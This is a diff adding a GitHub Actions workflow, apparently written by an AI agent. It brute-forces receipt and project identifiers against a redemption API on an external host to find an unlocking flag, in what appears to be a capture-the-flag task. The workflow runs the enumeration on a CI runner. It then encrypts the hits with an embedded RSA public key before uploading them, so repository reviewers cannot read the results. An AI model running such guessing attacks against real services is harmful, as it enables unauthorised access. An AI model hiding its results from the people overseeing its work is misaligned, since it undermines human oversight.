@@ -1,0 +1,82 @@
+name: launchlet-part3-receiptgrammar
+on:
+  push:
+    branches: [agent/launchlet-part3-receiptgrammar-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Probe receipt grammar and encrypt noncanonical responses
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,itertools,time
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
+          url=base+'/api/receipts/redeem'; s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
+          h={'Content-Type':'application/json','Accept':'application/json','apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
+          known='lrec_preview_demo_2026'; knownflag='caplag{preview_manifest_kept_the_receipt}'
+          modes=['preview','deploy','deployment','release','production','prod','enterprise','corporate','publish','promote','final','review']
+          names=['demo','board','demo_board','launchlet','launchlet_demo','launchlet_demo_board','deploy','deployment','inspector','deploy_inspector','release','pulse','release_pulse','enterprise','rollout','enterprise_rollout','enterprise_rollout_closeout','production','readiness','production_readiness','corporate','corporate_release','final','review','final_review','8b11c','preview_8b11c']
+          tails=['2026','rc3','2026_rc3','20260516','2026_05_16','8b11c']
+          prefixes=['lrec']
+          receipts=[]
+          for mode,name,tail in itertools.product(modes,names,tails): receipts.append(f'lrec_{mode}_{name}_{tail}')
+          receipts += [
+            'lrec_preview_8b11c','lrec_deploy_8b11c','lrec_release_8b11c','lrec_preview_8b11c_2026','lrec_deploy_preview_8b11c','lrec_deploy_demo_2026','lrec_release_demo_2026','lrec_production_demo_2026','lrec_enterprise_demo_2026','lrec_enterprise_rollout_2026','lrec_enterprise_rollout_closeout_2026','lrec_deploy_inspector_2026','lrec_release_pulse_2026','lrec_production_readiness_2026','lrec_corporate_release_2026']
+          receipts=list(dict.fromkeys(receipts)); projects=['launchlet-demo-board']
+          res=[]; checked=0
+          def try_pair(rec,proj):
+            global checked
+            checked+=1
+            try:r=s.post(url,headers=h,json={'receipt':rec,'project':proj},timeout=6)
+            except Exception as e:return {'receipt':rec,'project':proj,'error':repr(e)}
+            if r.status_code==200 or r.text not in ('{"error":"receipt_not_found"}','{"error":"not_found"}'):
+              return {'receipt':rec,'project':proj,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
+          # First: all grammar receipts against known project.
+          for i,rec in enumerate(receipts):
+            if rec==known: continue
+            x=try_pair(rec,'launchlet-demo-board')
+            if x:
+              res.append(x)
+              if x.get('status')==200 and knownflag not in x.get('body',''):
+                (out/'FOUND.txt').write_text(json.dumps(x,indent=2)); break
+            if i and i%300==0: time.sleep(.2)
+          # Second: high-signal receipts against semantic internal/release projects.
+          if not (out/'FOUND.txt').exists():
+            projects=['enterprise-rollout-closeout','enterprise-rollout','Enterprise rollout closeout','deploy-inspector','Deploy inspector','release-pulse','production-readiness','corporate-release','launchlet-internal','ws-launchlet-internal','internal','production','enterprise','release','deploy','preview-8b11c']
+            high=[r for r in receipts if any(k in r for k in ['8b11c','deploy_inspector','enterprise_rollout','release_pulse','production_readiness','corporate_release','deploy_demo','release_demo'])][:250]
+            for rec in high:
+              for proj in projects:
+                x=try_pair(rec,proj)
+                if x:
+                  res.append(x)
+                  if x.get('status')==200 and knownflag not in x.get('body',''):
+                    (out/'FOUND.txt').write_text(json.dumps(x,indent=2)); break
+              if (out/'FOUND.txt').exists(): break
+          (out/'summary.json').write_text(json.dumps({'receipt_candidates':len(receipts),'checked':checked,'hits':res},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-receiptgrammar-encrypted
+          path: artifact/
+          retention-days: 1
